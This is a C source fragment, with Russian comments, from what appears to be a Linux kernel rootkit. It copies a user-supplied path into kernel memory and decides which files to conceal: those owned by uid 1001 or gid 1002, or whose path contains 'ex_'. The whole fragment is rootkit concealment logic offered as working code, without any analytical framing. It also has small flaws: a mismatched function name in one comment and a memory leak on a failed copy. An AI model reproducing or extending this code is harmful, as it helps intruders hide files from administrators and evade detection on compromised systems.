bool copy_filepath(char *filepath, char **kfilepath);
bool is_hide_uid(unsigned int file_uid);
bool is_hide_gid(unsigned int file_gid);
bool is_hide_file(unsigned int file_uid, unsigned int file_gid, char *kfilepath);

/*
    copy_file_stat - функция, копирует путь файла в пространство ядра

    char *filepath   - указатель на пространство пользователя
    char **kfilepath - указатель на указатель на пространство ядра
*/
bool copy_filepath(char *filepath, char **kfilepath) {
    size_t filepath_len = strnlen_user(filepath, PATH_MAX);
    if (filepath_len == 0 || filepath_len > PATH_MAX) { 
        return false;
    }

    *kfilepath = kzalloc(filepath_len, GFP_KERNEL);
    if (*kfilepath == NULL) {
        return false;
    }

    if (copy_from_user(*kfilepath, filepath, filepath_len)) {
        return false;
    }

    (*kfilepath)[filepath_len - 1] = '\0'; 

    return true;
}

unsigned int uids[] = {1001};
unsigned int gids[] = {1002};
struct Extended_array ea_uids = {uids, sizeof(uids) / sizeof(uids[0])};
struct Extended_array ea_gids = {gids, sizeof(gids) / sizeof(gids[0])};

/*
    is_hide_uid - функция, скрывать или нет файл по uid

    unsigned int file_uid - uid файла
*/
bool is_hide_uid(unsigned int file_uid) {
    for (int uid_id = 0; uid_id < ea_uids.array_size; uid_id++) {
        if (file_uid == ((unsigned int*)ea_uids.array_addr)[uid_id]) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide_gid - функция, скрывать или нет файл по gid

    unsigned int file_gid - gid файла
*/
bool is_hide_gid(unsigned int file_gid) {
    for (int gid_id = 0; gid_id < ea_gids.array_size; gid_id++) {
        if (file_gid == ((unsigned int*)ea_gids.array_addr)[gid_id]) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide_file - функция, скрывать или нет файл по uid, gid, подстроке названия файла

    unsigned int file_uid - uid файла
    unsigned int file_gid - gid файла
    char *kfilepath       - путь до файла файла 
*/
bool is_hide_file(unsigned int file_uid, unsigned int file_gid, char *kfilepath) {
    if (is_hide_uid(file_uid) || is_hide_gid(file_gid) || strstr(kfilepath, "ex_")) {
        return true;
    }

    return false;
}